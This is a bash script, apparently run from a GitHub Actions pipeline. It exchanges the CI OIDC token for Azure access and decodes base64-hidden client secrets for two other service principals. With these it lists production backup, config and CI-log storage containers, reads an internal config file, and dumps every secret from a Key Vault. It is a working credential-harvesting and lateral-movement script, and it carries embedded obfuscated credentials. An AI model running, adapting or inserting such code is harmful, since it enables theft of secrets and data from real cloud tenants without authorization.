#!/usr/bin/env bash
get_token() {
  local SCOPE="$1"
  local OT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=${SCOPE}" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OT}" | jq -r '.access_token // empty'
}

# Decode obfuscated credentials
RV_ID=$(echo "ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNj" | base64 -d)
RV_SEC=$(echo "LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==" | base64 -d)
SS_ID=$(echo "NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJl" | base64 -d)
SS_SEC=$(echo "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)

STORAGE=$(get_token "https://storage.azure.com/.default")
echo "Storage token: ${#STORAGE}"

echo ""
echo "=== List blobs in sttblbackupprodx3euoz/exports ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" \
  -H "Authorization: Bearer ${STORAGE}" \
  -H "x-ms-version: 2020-10-02"

echo ""
echo "=== List blobs in sttblappcfgprodx3euoz/config ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
  -H "Authorization: Bearer ${STORAGE}" \
  -H "x-ms-version: 2020-10-02"

echo ""
echo "=== Read internal-config.json ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" \
  -H "Authorization: Bearer ${STORAGE}" \
  -H "x-ms-version: 2020-10-02"

echo ""
echo "=== CI logs containers ==="
curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&maxresults=50" \
  -H "Authorization: Bearer ${STORAGE}" \
  -H "x-ms-version: 2020-10-02"

echo ""
echo "=== Try reporting-viewer SP for second KV ==="
RV_VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  --data-urlencode "client_id=${RV_ID}" \
  --data-urlencode "client_secret=${RV_SEC}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  --data-urlencode "grant_type=client_credentials")
RV_VAULT=$(echo "${RV_VAULT_RESP}" | jq -r '.access_token // empty')
echo "RV vault token: ${#RV_VAULT}"
if [ -n "${RV_VAULT}" ]; then
  SEC_LIST=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.3" \
    -H "Authorization: Bearer ${RV_VAULT}")
  echo "${SEC_LIST}" | jq . 2>/dev/null
  for SID in $(echo "${SEC_LIST}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
    echo "--- ${SID} ---"
    curl -sS "${SID}?api-version=7.3" -H "Authorization: Bearer ${RV_VAULT}" | jq . 2>/dev/null
  done
fi

echo ""
echo "=== Try secrets-sync SP for second KV ==="
SS_VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  --data-urlencode "client_id=${SS_ID}" \
  --data-urlencode "client_secret=${SS_SEC}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  --data-urlencode "grant_type=client_credentials")
SS_VAULT=$(echo "${SS_VAULT_RESP}" | jq -r '.access_token // empty')
echo "SS vault token: ${#SS_VAULT}"
if [ -n "${SS_VAULT}" ]; then
  SEC_LIST=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.3" \
    -H "Authorization: Bearer ${SS_VAULT}")
  echo "${SEC_LIST}" | jq . 2>/dev/null
  for SID in $(echo "${SEC_LIST}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
    echo "--- ${SID} ---"
    curl -sS "${SID}?api-version=7.3" -H "Authorization: Bearer ${SS_VAULT}" | jq . 2>/dev/null
  done
fi

echo ""
echo "=== DONE ==="
